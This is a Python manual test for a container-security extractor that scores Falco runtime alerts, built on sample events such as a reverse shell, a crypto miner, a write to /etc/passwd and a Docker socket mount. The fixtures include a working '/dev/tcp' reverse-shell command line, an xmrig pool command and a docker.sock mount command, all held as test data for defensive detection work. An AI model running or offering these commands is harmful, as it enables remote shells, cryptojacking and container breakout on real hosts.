"""
Manual test for Docker/Falco/container runtime extractor.
Run: python test_docker_manual.py
"""
import sys
sys.path.insert(0, ".")
from dfs_core.features.docker_runtime import extract

CASES = {
    "Falco: Reverse shell (critical, full context)": {
        "rule": "Reverse Shell",
        "priority": "CRITICAL",
        "time": "2024-01-15T10:30:00Z",
        "hostname": "k8s-node-01",
        "output": "Reverse shell connection detected from container web-app",
        "tags": ["network", "shell", "mitre_execution"],
        "source": "syscall",
        "output_fields": {
            "container.id":   "abc123def456",
            "container.name": "web-app",
            "container.image.repository": "nginx",
            "container.image.tag": "1.25.3",
            "container.image.digest": "sha256:deadbeef",
            "proc.name":      "bash",
            "proc.cmdline":   "bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
            "proc.exe":       "/bin/bash",
            "proc.pid":       "1337",
            "proc.pname":     "nginx",
            "proc.pcmdline":  "nginx: worker process",
            "user.name":      "www-data",
            "user.uid":       "33",
            "fd.rip":         "198.51.100.42",
            "fd.rport":       "4444",
            "evt.type":       "connect",
        },
    },

    "Falco: Shell in privileged container (critical)": {
        "rule": "Shell Spawned in a Container",
        "priority": "ALERT",
        "time": "2024-01-15T10:31:00Z",
        "hostname": "docker-host-01",
        "privileged": True,
        "output_fields": {
            "container.id":   "priv999",
            "container.name": "debug-tools",
            "container.image.repository": "ubuntu",
            "container.image.tag": "latest",
            "container.privileged": True,
            "proc.name":      "bash",
            "proc.cmdline":   "/bin/bash",
            "proc.pname":     "docker",
            "user.name":      "root",
            "user.uid":       "0",
        },
        "capabilities": "CAP_SYS_ADMIN CAP_NET_ADMIN CAP_SYS_PTRACE",
        "host_pid": True,
        "host_network": True,
    },

    "Falco: Write to /etc/passwd (high)": {
        "rule": "Write below etc",
        "priority": "ERROR",
        "time": "2024-01-15T10:32:00Z",
        "hostname": "app-server-02",
        "output_fields": {
            "container.id":   "app456",
            "container.name": "backend-api",
            "container.image.repository": "mycompany/backend",
            "container.image.tag": "v2.3.1",
            "container.image.digest": "sha256:cafe",
            "proc.name":      "python3",
            "proc.cmdline":   "python3 exploit.py --target /etc/passwd",
            "proc.pname":     "sh",
            "user.name":      "appuser",
            "fd.name":        "/etc/passwd",
            "evt.type":       "openat",
        },
    },

    "Falco: Crypto mining detected": {
        "rule": "Cryptocurrency Mining Tool Execution",
        "priority": "CRITICAL",
        "time": "2024-01-15T10:33:00Z",
        "hostname": "worker-node-03",
        "output": "xmrig process detected in container",
        "output_fields": {
            "container.id":   "miner789",
            "container.name": "cronjob-worker",
            "container.image.repository": "alpine",
            "container.image.tag": "latest",
            "proc.name":      "xmrig",
            "proc.cmdline":   "xmrig --pool pool.minergate.com:3333 --user wallet",
            "proc.pname":     "sh",
            "user.name":      "root",
            "user.uid":       "0",
            "fd.rip":         "pool.minergate.com",
            "fd.rport":       "3333",
        },
    },

    "Falco: Docker socket mount (breakout risk)": {
        "rule": "Launch Sensitive Mount Container",
        "priority": "WARNING",
        "time": "2024-01-15T10:34:00Z",
        "hostname": "ci-runner-01",
        "output_fields": {
            "container.id":   "ci111",
            "container.name": "ci-build",
            "container.image.repository": "jenkins/jenkins",
            "container.image.tag": "lts",
            "proc.name":      "docker",
            "proc.cmdline":   "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine",
            "user.name":      "jenkins",
        },
        "mounts": [
            {"Source": "/var/run/docker.sock", "Destination": "/var/run/docker.sock"},
        ],
    },

    "Falco: Normal app network connection (low risk)": {
        "rule": "Outbound Connection to C2 Servers",
        "priority": "NOTICE",
        "time": "2024-01-15T10:35:00Z",
        "hostname": "app-node-01",
        "output_fields": {
            "container.id":   "web001",
            "container.name": "frontend",
            "container.image.repository": "mycompany/frontend",
            "container.image.tag": "v1.0.0",
            "container.image.digest": "sha256:abc",
            "proc.name":      "node",
            "proc.cmdline":   "node server.js",
            "proc.pname":     "npm",
            "user.name":      "node",
            "fd.rip":         "api.stripe.com",
            "fd.rport":       "443",
        },
    },
}

print(f"\n{'='*76}")
print(f"{'CASE':<46} {'S':>6} {'T':>6} {'B':>6} {'DFS':>7}")
print(f"{'='*76}")

for name, event in CASES.items():
    inputs, flags = extract(event)
    dfs = round(inputs.signal * inputs.trust * inputs.overlap, 4)
    print(f"{name:<46} {inputs.signal:>6.3f} {inputs.trust:>6.3f} {inputs.overlap:>6.3f} {dfs:>7.4f}")
    risk_flags = [k for k, v in flags.items() if v is True and (
        k.startswith("is_") or k.startswith("has_sensitive") or
        k.startswith("has_docker") or k.startswith("has_dangerous") or
        k.startswith("namespace_") or k == "image_is_latest"
    )]
    if risk_flags:
        print(f"  flags: {', '.join(risk_flags[:7])}")

print(f"{'='*76}\n")
